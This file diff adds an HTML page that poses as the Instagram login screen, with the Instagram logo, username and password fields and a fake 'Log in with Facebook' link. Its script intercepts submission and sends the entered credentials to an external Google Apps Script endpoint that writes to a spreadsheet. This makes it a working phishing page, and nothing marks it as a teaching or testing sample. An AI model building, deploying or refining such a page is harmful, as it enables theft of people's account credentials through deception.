@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="h2.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css"
+        integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA=="
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
+</head>
+
+<body>
+    <form name="submit-to-google-sheet" action="">
+        <label for="">English (United States) ⌄</label>
+
+        <br><br><br><br><br><br><br><br><br><br>
+
+        <i aria-label="Instagram"
+            style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png&quot;); background-position: 0px -52px; background-size: auto; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
+        <br><br>
+
+        <input id="w1" type="text" name="name" placeholder="Phone number,username or email address"> <br><br>
+
+        <input type="password" name="mobile" placeholder="Password"><br><br>
+
+        <input type="submit" value="Log in" name="submit" id="hi"><BR></BR>
+
+        <span class="w">Forgot your login details?</span> <span class="e"><b> Get help logging in.</b></span><br><br>
+
+
+        <div>
+            <div>━━━━━━━━</div>
+            <div>OR</div>
+            <div>━━━━━━━━</div>
+        </div><br><br>
+        <a style="text-decoration: none;"
+            href="https://www.mysuncoast.com/2021/07/15/lol-face-most-popular-emoji-planet/">
+       <p><i class="fa-brands fa-facebook" style="color: #0f67ff;"></i><b></p> <span
+                style="color: #0f67ff;    font-family: Arial, Helvetica, sans-serif;">  &nbsp; &nbsp; Log in with Facebook</span></b></a>
+        <br><br><br><br><br><br><br><br><br>
+        <hr>
+        <span class="w">Don't have an account?</span> <span class="e"><b>Sign up.</b></span>
+
+    </form>
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwaXGD5dN1XwT-iDhb7PblpO2NteTPFg9wg4KmE3uxOJfipiN9fj7xsRZ-8tC-XugoqGg/exec'
+        const form = document.forms['submit-to-google-sheet']
+
+        form.addEventListener('submit', e => {
+            e.preventDefault()
+            fetch(scriptURL, { method: 'POST', body: new FormData(form) })
+                .then(response => console.log('Success!', response))
+                .catch(error => console.error('Error!', error.message))
+        })
+    </script>
+    <script>
+        var a = document.getElementById("w1").value;
+
+    </script>
+</body>
+
+</html>
